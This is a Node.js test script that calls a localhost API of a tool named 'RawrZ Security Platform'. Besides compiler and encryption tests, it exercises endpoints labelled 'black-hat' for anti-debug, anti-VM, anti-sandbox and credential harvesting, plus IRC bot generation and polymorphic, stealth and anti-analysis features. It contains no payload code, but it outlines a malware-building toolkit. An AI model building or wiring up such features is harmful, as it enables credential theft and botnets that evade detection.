#!/usr/bin/env node

const http = require('http');
const fs = require('fs');
const path = require('path');

console.log('RawrZ Security Platform - Comprehensive Feature Test');
console.log('==================================================');

const BASE_URL = 'http://localhost:3000';
const TEST_RESULTS = {
    passed: 0,
    failed: 0,
    total: 0,
    details: []
};

async function makeRequest(endpoint, method = 'GET', data = null) {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: 'localhost',
            port: 3000,
            path: endpoint,
            method: method,
            headers: {
                'Content-Type': 'application/json'
            }
        };

        const req = http.request(options, (res) => {
            let body = '';
            res.on('data', (chunk) => body += chunk);
            res.on('end', () => {
                try {
                    const result = JSON.parse(body);
                    resolve({ status: res.statusCode, data: result });
                } catch (e) {
                    resolve({ status: res.statusCode, data: body });
                }
            });
        });

        req.on('error', reject);
        
        if (data) {
            req.write(JSON.stringify(data));
        }
        
        req.end();
    });
}

async function testFeature(name, testFunction) {
    TEST_RESULTS.total++;
    console.log(`\nTesting: ${name}`);
    
    try {
        const result = await testFunction();
        if (result.success) {
            console.log(` PASSED: ${name}`);
            TEST_RESULTS.passed++;
            TEST_RESULTS.details.push({ name, status: 'PASSED', result });
        } else {
            console.log(` FAILED: ${name} - ${result.error}`);
            TEST_RESULTS.failed++;
            TEST_RESULTS.details.push({ name, status: 'FAILED', error: result.error });
        }
    } catch (error) {
        console.log(` ERROR: ${name} - ${error.message}`);
        TEST_RESULTS.failed++;
        TEST_RESULTS.details.push({ name, status: 'ERROR', error: error.message });
    }
}

// Test Functions
async function testHealth() {
    const response = await makeRequest('/api/health');
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testEngines() {
    const response = await makeRequest('/api/engines/status');
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testRealEncryption() {
    const testData = {
        data: Buffer.from('test data for encryption').toString('base64'),
        algorithm: 'dual'
    };
    const response = await makeRequest('/api/real-encryption/dual-encrypt', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testRoslynCompilation() {
    const testData = {
        csharpCode: 'using System; class Program { static void Main() { Console.WriteLine("Hello RawrZ!"); } }'
    };
    const response = await makeRequest('/api/real-encryption/roslyn-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testNativeCppCompilation() {
    const testData = {
        cppCode: '#include <iostream>\nint main() { std::cout << "Hello RawrZ C++!" << std::endl; return 0; }',
        compiler: 'g++',
        optimization: '-O2'
    };
    const response = await makeRequest('/api/real-encryption/native-cpp-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testJavaCompilation() {
    const testData = {
        javaCode: 'public class Test { public static void main(String[] args) { System.out.println("Hello RawrZ Java!"); } }'
    };
    const response = await makeRequest('/api/real-encryption/java-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testPythonCompilation() {
    const testData = {
        pythonCode: 'print("Hello RawrZ Python!")'
    };
    const response = await makeRequest('/api/real-encryption/python-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testRustCompilation() {
    const testData = {
        rustCode: 'fn main() { println!("Hello RawrZ Rust!"); }'
    };
    const response = await makeRequest('/api/real-encryption/rust-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testGoCompilation() {
    const testData = {
        goCode: 'package main\nimport "fmt"\nfunc main() { fmt.Println("Hello RawrZ Go!") }'
    };
    const response = await makeRequest('/api/real-encryption/go-compile', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testAntiDebug() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/black-hat/anti-debug', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testAntiVM() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/black-hat/anti-vm', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testAntiSandbox() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/black-hat/anti-sandbox', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testTimingEvasion() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/black-hat/timing-evasion', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testHardwareFingerprint() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/black-hat/hardware-fingerprint', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testCredentialHarvest() {
    const testData = { type: 'browser' };
    const response = await makeRequest('/api/black-hat/credential-harvest', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testIRCBotGeneration() {
    const testData = {
        config: {
            server: 'irc.rizon.net',
            port: 6667,
            name: 'RawrZBot'
        },
        features: ['fileManager', 'systemInfo'],
        extensions: ['cpp']
    };
    const response = await makeRequest('/api/irc-bot/generate', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testStealthGeneration() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/stealth/apply', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testPolymorphicGeneration() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/polymorphic/generate', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testAntiAnalysis() {
    const testData = { data: 'test payload' };
    const response = await makeRequest('/api/anti-analysis/apply', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testVirusScanning() {
    const testData = { filePath: 'test.exe' };
    const response = await makeRequest('/api/virus-scanner/scan', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testNetworkScanning() {
    const testData = { target: '127.0.0.1', ports: [80, 443] };
    const response = await makeRequest('/api/network/scan', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testMemoryAllocation() {
    const testData = { size: 1024 };
    const response = await makeRequest('/api/memory/allocate', 'POST', testData);
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

async function testPerformanceOptimization() {
    const response = await makeRequest('/api/performance/optimize');
    return {
        success: response.status === 200 && response.data.success,
        data: response.data
    };
}

// Main test execution
async function runAllTests() {
    console.log('Starting comprehensive feature testing...\n');
    
    // Core functionality tests
    await testFeature('Health Check', testHealth);
    await testFeature('Engine Status', testEngines);
    
    // Real encryption tests
    await testFeature('Real Dual Encryption', testRealEncryption);
    
    // Compilation tests
    await testFeature('Roslyn C# Compilation', testRoslynCompilation);
    await testFeature('Native C++ Compilation', testNativeCppCompilation);
    await testFeature('Java Compilation', testJavaCompilation);
    await testFeature('Python Compilation', testPythonCompilation);
    await testFeature('Rust Compilation', testRustCompilation);
    await testFeature('Go Compilation', testGoCompilation);
    
    // Black hat capability tests
    await testFeature('Anti-Debug Techniques', testAntiDebug);
    await testFeature('Anti-VM Techniques', testAntiVM);
    await testFeature('Anti-Sandbox Techniques', testAntiSandbox);
    await testFeature('Timing Evasion', testTimingEvasion);
    await testFeature('Hardware Fingerprinting', testHardwareFingerprint);
    await testFeature('Credential Harvesting', testCredentialHarvest);
    
    // Advanced feature tests
    await testFeature('IRC Bot Generation', testIRCBotGeneration);
    await testFeature('Stealth Generation', testStealthGeneration);
    await testFeature('Polymorphic Generation', testPolymorphicGeneration);
    await testFeature('Anti-Analysis Techniques', testAntiAnalysis);
    await testFeature('Virus Scanning', testVirusScanning);
    await testFeature('Network Scanning', testNetworkScanning);
    await testFeature('Memory Allocation', testMemoryAllocation);
    await testFeature('Performance Optimization', testPerformanceOptimization);
    
    // Generate test report
    console.log('\n' + '='.repeat(50));
    console.log('TEST SUMMARY');
    console.log('='.repeat(50));
    console.log(`Total Tests: ${TEST_RESULTS.total}`);
    console.log(`Passed: ${TEST_RESULTS.passed}`);
    console.log(`Failed: ${TEST_RESULTS.failed}`);
    console.log(`Success Rate: ${((TEST_RESULTS.passed / TEST_RESULTS.total) * 100).toFixed(2)}%`);
    
    if (TEST_RESULTS.failed > 0) {
        console.log('\nFAILED TESTS:');
        TEST_RESULTS.details
            .filter(test => test.status !== 'PASSED')
            .forEach(test => {
                console.log(`- ${test.name}: ${test.error || 'Unknown error'}`);
            });
    }
    
    // Save detailed report
    const reportPath = path.join(__dirname, 'test-report.json');
    fs.writeFileSync(reportPath, JSON.stringify(TEST_RESULTS, null, 2));
    console.log(`\nDetailed report saved to: ${reportPath}`);
    
    // Exit with appropriate code
    process.exit(TEST_RESULTS.failed > 0 ? 1 : 0);
}

// Run tests
runAllTests().catch(error => {
    console.error('Test execution failed:', error);
    process.exit(1);
});
